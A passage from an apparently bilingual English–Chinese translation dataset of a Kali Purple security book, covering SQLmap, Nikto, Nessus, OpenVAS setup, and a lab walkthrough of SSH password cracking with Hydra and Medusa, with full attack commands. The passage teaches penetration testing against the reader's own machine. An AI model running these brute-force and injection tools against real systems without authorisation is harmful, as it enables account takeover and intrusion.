    schema, tables, columns, and data stored within the target database. This could
    end up providing very valuable insights for the pentester to use for further exploitation
    of a system or organization.'
  id: totrans-161
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**检测和数据库架构数据**：该应用程序可以识别目标数据库中存储的数据库架构、表、列和数据。这可能为渗透测试人员提供进一步利用系统或组织的非常宝贵的见解。'
- en: '**Brute force and dictionary-based attacks**: SQLmap supports brute-force and
    dictionary-styled attacks, which it uses in attempts to guess database names,
    tables, columns, and user accounts.'
  id: totrans-162
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**暴力破解和基于字典的攻击**：SQLmap 支持暴力破解和基于字典的攻击，它尝试猜测数据库名称、表、列和用户帐户。'
- en: '**SQL shell**: SQLmap provides an interactive SQL-based shell for executing
    commands directly upon the target system’s database. This gives the pentesters
    an avenue to perform advanced database manipulation.'
  id: totrans-163
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SQL shell**：SQLmap 提供了一个基于 SQL 的交互式 shell，用于直接在目标系统的数据库上执行命令。这为渗透测试人员提供了一个执行高级数据库操作的途径。'
- en: '**Enumeration of backend database credentials**: SQLmap can retrieve usernames
    and password hashes from the database, facilitating unauthorized access to the
    database.'
  id: totrans-164
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**后端数据库凭据的枚举**：SQLmap 可以从数据库中检索用户名和密码哈希，从而促成对数据库的未经授权访问。'
- en: '**Detection of filesystem access**: By taking advantage of any discovered SQL
    injection vulnerabilities on the server, SQLmap can detect filesystem access and
    enable access to sensitive files on the server.'
  id: totrans-165
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**检测文件系统访问**：通过利用服务器上发现的任何 SQL 注入漏洞，SQLmap 可以检测文件系统访问并允许访问服务器上的敏感文件。'
- en: '**Customizable testing parameters**: SQLmap offers a wide range of testing
    options and parameters to customize the scanning process based on specific requirements
    and target applications.'
  id: totrans-166
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**可定制的测试参数**：SQLmap 提供了广泛的测试选项和参数，可根据特定要求和目标应用程序定制扫描过程。'
- en: '**Detection of blind SQL injection**: SQLmap can also detect blind SQL injection
    vulnerabilities. This is where the application will not display error responses.
    It detects these vulnerabilities by using time-based and Boolean-based techniques
    to run interference.'
  id: totrans-167
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**检测盲 SQL 注入**：SQLmap 还可以检测盲 SQL 注入漏洞。这是应用程序不会显示错误响应的情况。它通过使用基于时间和基于布尔的技术来运行干扰，以检测这些漏洞。'
- en: '**Integration and support for web application firewalls (WAFs) and other tools**:
    SQLmap can bypass certain WAFs and evasion techniques to successfully exploit
    SQL injection vulnerabilities in protected web applications. It can also be integrated
    with popular web application security testing tools such as Burp Suite.'
  id: totrans-168
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**集成和支持 Web 应用程序防火墙（WAF）和其他工具**：SQLmap 可以绕过某些 WAF 和规避技术，成功利用受保护的 Web 应用程序中的
    SQL 注入漏洞。它还可以与 Burp Suite 等流行的 Web 应用程序安全测试工具集成。'
- en: To get SQLmap, at the command line, type **sudo apt update** and **sudo apt
    upgrade** if it suits you. Follow this up with **sudo apt** **install sqlmap**.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 要获取 SQLmap，请在命令行上输入 **sudo apt update** 和 **sudo apt upgrade**（如果适用）。然后使用 **sudo
    apt install sqlmap**。
- en: To use the application, type **sqlmap -u <target>**, where **target** is the
    target URL of the application or database you wish to attack.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 若要使用该应用程序，请键入 **sqlmap -u <目标>**，其中 **目标** 是您希望攻击的应用程序或数据库的目标 URL。
- en: Nikto
  id: totrans-171
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Nikto
- en: '**Nikto** is another scanner, one that specializes in scanning web servers.
    It’s very lightweight and easy to use.'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: '**Nikto** 是另一个扫描程序，专门用于扫描 Web 服务器。它非常轻量级且易于使用。'
- en: 'First, grab a copy by doing your **sudo apt update** and **upgrade** magic
    and continue by typing **sudo apt install nikto**. It should install very quickly
    and painlessly. Once done and since you’re already in your Kali Purple environment,
    you should be able to invoke the utility and perform a scan immediately and directly
    from the command line. Type **nikto -h <target>**. In our case, we’ll just scan
    our localhost. So, we’ll type **nikto -h 127.0.0.1**. As shown in *Figure 10**.18*,
    it didn’t find much – because we don’t have much. However, much is not always
    necessary in the eyes of an attacker. Look carefully at the results; you will
    still find an abundance of useful information that was returned from the scan:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，通过执行你的**sudo apt update**和**upgrade**魔法，继续输入**sudo apt install nikto**来抓取副本。安装应该非常快速和无痛。一旦完成，由于你已经在Kali
    Purple环境中，你应该能够立即从命令行调用该实用程序并进行扫描。输入**nikto -h <目标>**。在我们的情况下，我们只扫描本地主机。所以，我们会输入**nikto
    -h 127.0.0.1**。如*图10**.18*所示，它没有找到太多 - 因为我们没有太多。然而，在攻击者眼中，不一定总是需要太多。仔细查看结果；你仍然会找到大量来自扫描返回的有用信息：
- en: '![Figure 10.18 – Nikto scan of the Kali Purple host system’s web server](image/B21223_10_18.jpg)'
  id: totrans-174
  prefs: []
  type: TYPE_IMG
  zh: '![图10.18 - Kali Purple主机系统Web服务器的Nikto扫描](image/B21223_10_18.jpg)'
- en: Figure 10.18 – Nikto scan of the Kali Purple host system’s web server
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.18 - Kali Purple主机系统Web服务器的Nikto扫描
- en: Our limited results scan still told us that the type of web server is CherryPy
    version 18.9.0\. Ohhhhh… but look at the juicy bit of intelligence on the very
    next line! This server doesn’t have an anti-clickjacking X-Frame Option header.
    If you were a cybercriminal looking to exploit, what do you suppose you would
    do with that? That’s right – you’d want to consider clickjacking attacks! If you’re
    an experienced attacker, you’ll first search for any publicly available information
    about clickjacking as it relates to that specific server type and version. In
    many cases, the information – sometimes even step-by-step handholding instructions
    – is already out there on the web. Conversely, if you’re a pentester, you now
    know you need to perform equivalent research in terms of how to provide the anti-clickjacking
    X-Frame Option header.
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 我们有限的结果扫描仍然告诉我们，Web服务器类型是CherryPy版本18.9.0。哦哦哦…但是看看接下来的一行情报！这个服务器没有反点击劫持的X-Frame选项头。如果你是一个寻求利用的网络罪犯，你认为会做什么？没错
    - 你会考虑点击劫持攻击！如果你是一名经验丰富的攻击者，你会首先搜索关于点击劫持与特定服务器类型和版本相关的任何公开信息。在许多情况下，这些信息 - 有时甚至包括逐步操作说明
    - 已经存在于网络上。相反，如果你是一名渗透测试人员，现在你知道你需要进行等效研究，以了解如何提供反点击劫持X-Frame选项头。
- en: Nessus
  id: totrans-177
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Nessus
- en: If you go to work in a SOC environment, you will eventually come across traffic
    that traces to Tenable Network Security’s flagship product, **Nessus**. Nessus
    is a vulnerability assessment and management tool that’s designed to help organizations
    identify and remediate vulnerabilities in their network, infrastructure, and systems.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你在SOC环境中工作，最终会遇到追溯到Tenable Network Security旗舰产品**Nessus**的流量。Nessus是一个漏洞评估和管理工具，旨在帮助组织识别和修复其网络、基础设施和系统中的漏洞。
- en: 'Nessus’ highlights – which you’ve already seen in other software we’ve covered
    – include the following:'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: Nessus的亮点 - 你已经在我们涵盖的其他软件中见过 - 包括以下内容：
- en: Customizable vulnerability scanning
  id: totrans-180
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 可定制的漏洞扫描
- en: Support for multiple operating systems
  id: totrans-181
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 支持多操作系统
- en: API integration and plugin-based architecture
  id: totrans-182
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: API集成和基于插件的架构
- en: Policy compliance and configuration auditing
  id: totrans-183
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 政策合规性和配置审计
- en: Patching and remediation
  id: totrans-184
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 补丁和修复
- en: Scheduled scans and reporting
  id: totrans-185
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 定期扫描和报告
- en: Risk prioritization
  id: totrans-186
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 风险优先级排序
- en: Support for both cloud and on-premises deployment
  id: totrans-187
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 支持云端和本地部署
- en: Scalability and performance
  id: totrans-188
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 可扩展性和性能
- en: Tenable’s Nessus is a commercial product that only offers a 7-day free trial.
    Since the theme of this book is helping marry free and open source solutions with
    the equally free and open source Kali Purple, we won’t go into too much detail
    here. However, we’d be remiss not to mention this product and that it is compatible
    with the Kali Purple operating system given its wide-scale popularity in the cybersecurity
    community. We’ve placed a link in *Further reading* if you wish to learn more
    about one of the most recognized vulnerability scanners in the world.
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: Tenable的Nessus是一个商业产品，仅提供7天的免费试用。由于本书的主题是帮助将免费和开源的解决方案与同样免费的开源Kali Purple结合使用，我们不会在这里详细讨论它。不过，我们不得不提到这个产品，并指出它与Kali
    Purple操作系统兼容，因为它在网络安全社区中广受欢迎。如果你希望了解更多关于世界上最知名的漏洞扫描工具之一的内容，我们已在*进一步阅读*部分提供了链接。
- en: Greenbone Vulnerability Management and OpenVAS
  id: totrans-190
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Greenbone漏洞管理与OpenVAS
- en: OpenVAS is an open source version of vulnerability scanning and a competing
    product to Nessus.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: OpenVAS是一个开源的漏洞扫描版本，是Nessus的竞争产品。
- en: 'OpenVAS’ highlights – which you’ve already seen in other software we’ve covered
    – include the following:'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: OpenVAS的亮点——你已经在我们之前讨论的其他软件中见过——包括：
- en: Vulnerability scanning
  id: totrans-193
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 漏洞扫描
- en: Automated and scheduled scanning
  id: totrans-194
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 自动化和定时扫描
- en: Network discovery
  id: totrans-195
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 网络发现
- en: CVE compatibility
  id: totrans-196
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: CVE兼容性
- en: Reporting and remediation
  id: totrans-197
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 报告与修复
- en: Scalability and flexibility
  id: totrans-198
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 可扩展性和灵活性
- en: Third-party integration support
  id: totrans-199
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 第三方集成支持
- en: Threat intelligence feeds
  id: totrans-200
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 威胁情报数据源
- en: Community-wide support
  id: totrans-201
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 社区广泛支持
- en: 'You can grab **OpenVAS** through the typical means. Run **sudo apt update**
    and **upgrade**, which you’re probably able to do blindfolded by now. Then, continue
    by typing **sudo apt install gvm-tools**. This is where things depart from how
    we’ve done things in the past. Accept any prompts if there are any and wait a
    few minutes for **Greenbone**, which includes OpenVAS to install. Once it’s done,
    you still have some configuring to do. Select the Kali dragon icon in the top
    left and start typing **gvm** until some **gvm** fields populate, as shown in
    *Figure 10**.19*:'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以通过常规方式获取**OpenVAS**。运行**sudo apt update**和**upgrade**，现在你可能已经能闭着眼睛完成了。然后，继续输入**sudo
    apt install gvm-tools**。这时，过程与我们过去的做法有所不同。如果出现任何提示，接受它们并等待几分钟，**Greenbone**（包括OpenVAS）将会安装完成。安装完成后，你仍然需要进行一些配置。在左上角选择Kali龙标志，开始输入**gvm**，直到出现一些**gvm**字段，如*图10.19*所示：
- en: '![Figure 10.19 – Greenbone management options under the Kali dragon logo](image/B21223_10_19.jpg)'
  id: totrans-203
  prefs: []
  type: TYPE_IMG
  zh: '![图10.19 – Kali龙标志下的Greenbone管理选项](image/B21223_10_19.jpg)'
- en: Figure 10.19 – Greenbone management options under the Kali dragon logo
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.19 – Kali龙标志下的Greenbone管理选项
- en: Start by selecting **gvm initial setup** and let it run its course. Everything
    is automated. Then, select **gvm check setup**. You might be prompted to fix a
    certificate error by typing **sudo runuser -u _gvm – gvm-manage-certs -a -f**
    – trust us, it’s worth typing that command. It will save you a lot of time and
    effort and if you aren’t up to speed with certificates, it will also save you
    a lot of headaches. When you’re finished, run the **gvm check setup** option again.
    Pay close attention to see if there are any additional errors or commands to run.
    One of the sweetest features of this process is that if there are any adjustments,
    it will tell you precisely character-for-character what to type. Run this feature
    over and over until there are no more configurations or adjustments to make. Keep
    in mind that any time you’re updating a feed, there will be a long delay. Be patient.
    The operating system isn’t hanging. It simply takes a long time for those items
    to complete.
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 首先选择**gvm初始设置**并让它自行运行。整个过程是自动化的。然后，选择**gvm检查设置**。系统可能会提示你通过输入**sudo runuser
    -u _gvm – gvm-manage-certs -a -f**来修复证书错误——相信我们，输入这个命令是值得的。它将节省你大量的时间和精力，如果你对证书不熟悉，它还会帮你避免很多麻烦。完成后，再次运行**gvm检查设置**选项。仔细观察是否有其他错误或需要运行的命令。这个过程最棒的特点之一是，如果需要进行任何调整，它会准确地逐字符告诉你该输入什么。重复运行此功能，直到不再需要进行任何配置或调整。请记住，每次更新数据源时都会有较长的延迟。请耐心等待。操作系统并没有卡住。只是这些任务完成需要一些时间。
- en: Install the Redis server by typing **sudo apt install redis** and then start
    the service by typing **sudo systemctl start redis**. Verify it’s running properly
    by typing **sudo systemctl status redis**. When you get this far, because installing
    and configuring GVM can tend to be a bit of a hassle and is very sensitive to
    upgrades, we highly recommend doing another **sudo apt update**/**upgrade** to
    ensure everything is operating on an even keel and then completely rebooting and/or
    restarting GVM. Just like Nmap, SQLmap, and Nikto, the commands to initiate a
    scan are fairly straightforward. Type **gvm-cli -h** to get a list of options
    and have fun!
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 通过输入 **sudo apt install redis** 安装 Redis 服务器，然后通过输入 **sudo systemctl start redis**
    启动服务。输入 **sudo systemctl status redis** 来验证它是否正常运行。当你完成这些步骤时，由于安装和配置 GVM 可能会有些麻烦，并且对升级非常敏感，我们强烈建议再执行一次
    **sudo apt update**/**upgrade** 以确保一切正常运行，然后完全重启并/或重新启动 GVM。就像 Nmap、SQLmap 和 Nikto
    一样，启动扫描的命令非常简单。输入 **gvm-cli -h** 获取选项列表，享受吧！
- en: As you can see, Kali Purple offers a plethora of scanning utilities covering
    nearly every scanning type and style you could think of, from network to database
    to web servers to infrastructure. Some scanning tools are built to handle more
    than one area of specialization. What happens when these scanners uncover vulnerabilities,
    such as weak password rulesets? Sure enough, Kali Purple also has tools to assist
    in exploiting discovered vulnerabilities.
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，Kali Purple 提供了大量的扫描工具，涵盖了几乎所有你能想到的扫描类型和风格，从网络到数据库到 Web 服务器到基础设施。一些扫描工具是为处理多个专业领域而设计的。当这些扫描器发现漏洞时，例如弱密码规则集，怎么办？果然，Kali
    Purple 也有工具来帮助利用已发现的漏洞。
- en: Password cracking
  id: totrans-208
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 密码破解
- en: Scanning and finding vulnerabilities in web or other technology applications
    is an integral part of the overall cyberattack flow. However, the ultimate goal
    is to gain access to the target and, if possible, elevate your privileges once
    inside so that you can wreak all manners of remorseless havoc.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 扫描和发现 Web 或其他技术应用中的漏洞是整个网络攻击流程的一个重要组成部分。然而，最终的目标是获取目标的访问权限，并在可能的情况下，提升权限，以便可以造成各种无情的破坏。
- en: Hydra
  id: totrans-210
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Hydra
- en: '**Hydra** is a password-cracking tool that is widely used for performing online
    password attacks on various network protocols. Its design is meant to help cybersecurity
    pentesters and other offensive security personnel work against the security of
    network systems by guessing and/or identifying weak passwords.'
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: '**Hydra** 是一款广泛用于对各种网络协议执行在线密码攻击的密码破解工具。它的设计旨在帮助网络安全渗透测试人员及其他进攻性安全人员通过猜测和/或识别弱密码来对抗网络系统的安全性。'
- en: 'Here are some highlights of Hydra:'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是 Hydra 的一些亮点：
- en: Support for multiple types of protocols
  id: totrans-213
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 支持多种协议类型
- en: Brute-force and dictionary attacks
  id: totrans-214
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 暴力破解和字典攻击
- en: Parallelized attack sessions
  id: totrans-215
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 并行化攻击会话
- en: Customizable attack parameters
  id: totrans-216
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 可自定义的攻击参数
- en: Session resumption and pause/resume functionality
  id: totrans-217
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 会话恢复及暂停/恢复功能
- en: Username enumeration
  id: totrans-218
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 用户名枚举
- en: User-friendly command-line interface
  id: totrans-219
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 用户友好的命令行界面
- en: Logging and reporting
  id: totrans-220
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 日志记录与报告
- en: Support for SSL/TLS security
  id: totrans-221
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 支持 SSL/TLS 安全
- en: Cross-platform compatibility
  id: totrans-222
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 跨平台兼容性
- en: Extensibility with community support
  id: totrans-223
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 具有社区支持的可扩展性
- en: To use Hydra, you can select the Kali dragon icon in the top-left corner of
    our environment and either type **Hydra** in the search bar or scroll down and
    highlight **Password Attacks**. Then, move your cursor to the newly expanded column
    on the right-hand side and click on the **Hydra** option.
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用 Hydra，你可以选择我们环境左上角的 Kali 龙图标，然后在搜索栏中输入 **Hydra**，或者向下滚动并突出显示 **Password
    Attacks**。接着，将鼠标移到右侧新展开的栏目中，点击 **Hydra** 选项。
- en: Otherwise, if you prefer to type, then type **sudo apt update**; if the results
    suggest upgrades, you’ll want to type **sudo apt upgrade** to install them. Once
    you’re finished, type **sudo apt install hydra** to formally install Hydra.
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你更喜欢输入命令，可以输入 **sudo apt update**；如果结果显示有升级，你需要输入 **sudo apt upgrade** 来安装它们。完成后，输入
    **sudo apt install hydra** 正式安装 Hydra。
- en: 'For Hydra to work effectively, you will need to either create (good luck with
    that) or download a password list for the program to use. Here is a brief list
    of popular password lists people use with password-cracking utilities:'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 为了让 Hydra 有效工作，你需要创建（祝你好运）或下载一个密码列表供程序使用。以下是一些人们常用的密码破解工具的流行密码列表：
- en: '**SecLists**: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)'
  id: totrans-227
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SecLists**: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)'
- en: '**Daniel Miessler’s personal GitHub** **repository**: [https://github.com/danielmiessler](https://github.com/danielmiessler)'
  id: totrans-228
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Daniel Miessler 的个人 GitHub** **仓库**: [https://github.com/danielmiessler](https://github.com/danielmiessler)'
- en: '**CrackStation**: [https://crackstation.net/](https://crackstation.net/)'
  id: totrans-229
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**CrackStation**: [https://crackstation.net/](https://crackstation.net/)'
- en: '**Probable-Wordlists**: [https://github.com/berzerk0/Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)'
  id: totrans-230
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Probable-Wordlists**: [https://github.com/berzerk0/Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)'
- en: '**Weakpass**: [https://weakpass.com/wordlist](https://weakpass.com/wordlist)'
  id: totrans-231
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Weakpass**: [https://weakpass.com/wordlist](https://weakpass.com/wordlist)'
- en: '**Hashes.org**: [https://hashes.org](https://hashes.org)'
  id: totrans-232
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Hashes.org**: [https://hashes.org](https://hashes.org)'
- en: We are going to use SecLists for our example. To do so, type **git** **clone
    https://github.com/danielmiessler/SecLists.git**.
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用 SecLists 作为示例。为此，输入 **git** **clone https://github.com/danielmiessler/SecLists.git**。
- en: 'Navigate to the directory containing various password lists by typing **cd
    SecLists/Passwords/** and then typing **ls** to confirm you’re in the right place.
    If using **cd** doesn’t work, add a forward slash before **SecLists** and try
    again. You should see a list of many different styles of password lists, as shown
    in *Figure 10**.20*. We’re going to work off of the **2023-200_most_used_passwords.txt**
    file. Let’s edit that file by typing **sudo nano 2023-200_most_used_passwords.txt**.
    On any blank line inside the file, type the password you use to log in to your
    Kali Purple instance. If there isn’t a blank line, just use the arrow keys on
    your keyboard to align your cursor at the beginning of any line and press *Enter*
    to create a new line. Then, once again, use the arrow keys to move to the empty
    line and input your Kali Purple password. Press *Ctrl* + *X* and select *Y* to
    save it:'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 通过键入 **cd SecLists/Passwords/** 来导航到包含各种密码列表的目录，然后输入 **ls** 来确认你是否在正确的位置。如果使用
    **cd** 不起作用，请在 **SecLists** 前加上一个正斜杠并重试。你应该会看到许多不同风格的密码列表，如 *图 10.20* 所示。我们将使用
    **2023-200_most_used_passwords.txt** 文件。让我们通过键入 **sudo nano 2023-200_most_used_passwords.txt**
    来编辑该文件。在文件中的任意空白行输入你用来登录 Kali Purple 实例的密码。如果没有空白行，只需使用键盘上的箭头键将光标对齐到任何一行的开头，并按
    *Enter* 创建一个新行。然后，再次使用箭头键移动到空白行，输入你的 Kali Purple 密码。按 *Ctrl* + *X* 并选择 *Y* 保存：
- en: '![Figure 10.20 – Hydra /SecLists/Passwords directory of password files](image/B21223_10_20.jpg)'
  id: totrans-235
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.20 – Hydra /SecLists/Passwords 目录中的密码文件](image/B21223_10_20.jpg)'
- en: Figure 10.20 – Hydra /SecLists/Passwords directory of password files
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.20 – Hydra /SecLists/Passwords 目录中的密码文件
- en: We are doing this for demonstration purposes and to keep the crack efficient.
    We could, in theory, grab a much more in-depth password list that would likely
    have your Kali Purple password already listed unless you’ve followed some of the
    advanced password creation methods we’ve talked about in this book. However, the
    longer the list, the longer it will take Hydra to work through unless we just
    get lucky, and you happen to have selected a password that is near the top of
    the list. In Kali Purple, any newly installed and/or launched utilities, such
    as this SSH server, are going to inherit your default Kali Purple credentials.
    So, if you’re setting things up in a production environment, make sure to change
    your default credentials with each application you set up on your system.
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 我们这样做是为了演示目的，并保持破解过程高效。从理论上讲，我们可以抓取一个更深入的密码列表，该列表可能已经列出了你的 Kali Purple 密码，除非你已经遵循了本书中讨论的一些高级密码创建方法。然而，列表越长，Hydra
    完成工作的时间就越长，除非我们足够幸运，你刚好选择了一个位于列表顶部的密码。在 Kali Purple 中，任何新安装或启动的工具，例如这个 SSH 服务器，都会继承你默认的
    Kali Purple 凭据。因此，如果你在生产环境中进行设置，请确保在每次设置系统中的应用程序时更改默认凭据。
- en: Now, type **pwd** to get the full file path leading to that directory and remember
    or record that path. Remember, **pwd** stands for **Print Working Directory**.
    It’s easy for folks to mistakenly believe it stands for *password*, which could
    be confusing if you were somewhat new to Linux and attempting a pentest. You will
    use that full path in your attack in a moment. We’re going to attack an SSH server
    but to do so, we need to spin one up. Type **sudo systemctl start ssh**; when
    your command prompt returns, type **sudo systemctl status ssh** to ensure the
    service is up and running. The terminal will tell you that it is running if it
    is. From here, we are going to launch a password crack attempt against our SSH
    server using Hydra. Armed with that information and the full file path, you will
    decide which password file you’d like Hydra to use and simply enter the command
    stating the username you’d like Hydra to use, the complete file path of the password
    file you intend to use, and the protocol you are attacking – in this case, the
    SSH server.
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，输入**pwd**来获取指向该目录的完整文件路径，并记住或记录下这个路径。记住，**pwd**代表的是**打印工作目录**。很多人可能会误以为它代表*密码*，这在你对Linux不太熟悉并尝试进行渗透测试时可能会造成困惑。稍后你将在攻击中使用这个完整路径。我们将攻击一个SSH服务器，但为了这样做，我们需要先启动一个。输入**sudo
    systemctl start ssh**；当命令提示符返回时，输入**sudo systemctl status ssh**以确保服务已启动并运行。如果服务正在运行，终端会告诉你。从这里开始，我们将使用Hydra对SSH服务器进行密码破解尝试。掌握了这些信息和完整的文件路径后，你将决定使用哪个密码文件，并简单地输入命令，指定你希望Hydra使用的用户名、密码文件的完整路径以及你要攻击的协议——在本例中是SSH服务器。
- en: Before launching Hydra, type **ifconfig** and make a note of the interface you
    wish to attack. By default, this should be the **eth0** interface. If you have
    it set to **eth1** or a custom-named interface, then you already have the technical
    knowledge to grab the IP address you need before proceeding to the next step.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 在启动Hydra之前，输入**ifconfig**并记下你想要攻击的接口。默认情况下，这应该是**eth0**接口。如果你设置为**eth1**或自定义名称的接口，那么你已经具备了抓取所需IP地址的技术知识，可以继续进行下一步。
- en: Launch the attack by typing **hydra -l <KaliPurpleUserName> -P <FullPathToPasswordFile>
    ssh<either eth0 or eth1 IP address>**. So, in our case, this demonstration Kali
    Purple instance was given the username and password of karllane. Naturally, we
    would use different and more complicated values for a production or non-training
    system. The full path to our password file that we learned after typing **pwd**
    earlier is **/home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt**.
    Therefore, the full attack command that we typed to launch the attack was **hydra
    -l karllane -P /****home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt
    ssh://10.0.2.15**.
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: 通过输入**hydra -l <KaliPurpleUserName> -P <FullPathToPasswordFile> ssh<eth0或eth1的IP地址>**来启动攻击。因此，在我们的案例中，这个Kali
    Purple实例的用户名和密码是karllane。通常，在生产系统或非培训系统中，我们会使用不同且更复杂的值。我们之前通过输入**pwd**命令获得的密码文件的完整路径是**/home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt**。因此，我们输入的完整攻击命令是**hydra
    -l karllane -P /home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt
    ssh://10.0.2.15**。
- en: 'If everything worked out as planned, Hydra should discover your password fairly
    quickly – by fairly quickly, we mean in a nano-second, as shown in *Figure 10**.21*:'
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 如果一切按计划进行，Hydra应该会非常迅速地发现你的密码——这里所说的“非常迅速”是指在纳秒级别，如*图 10.21*所示：
- en: '![Figure 10.21 – Hydra – successful password crack against our Kali Purple
    SSH server](image/B21223_10_21.jpg)'
  id: totrans-242
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.21 – Hydra – 成功破解我们的Kali Purple SSH服务器的密码](image/B21223_10_21.jpg)'
- en: Figure 10.21 – Hydra – successful password crack against our Kali Purple SSH
    server
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.21 – Hydra – 成功破解我们的Kali Purple SSH服务器的密码
- en: Now, let’s take a look at Medusa.
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们来看一下Medusa。
- en: Medusa
  id: totrans-245
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Medusa
- en: '**Medusa** is a tool that is very similar in function to Hydra. It is not in
    the Kali menu by default but will show up there under **Password Attacks** after
    you install it from the command line. Do that now. Type **sudo apt update** and
    then **sudo apt upgrade** if you prefer. Once you’ve finished, type the command
    to formally install Medusa – that is, **sudo apt install medusa**. Since we already
    did the hard work setting everything up with Hydra, this will go much quicker.
    After installing it, you can pretty much launch your attack right away, assuming
    your SSH server is still up and running. To find out, type **sudo systemctl status
    ssh**; if it’s not running, retype that command, replacing the word **status**
    with **start**. Then, launch your attack by typing **medusa -h 10.0.2.15 -u karllane
    -P /home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt -****M ssh**.'
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
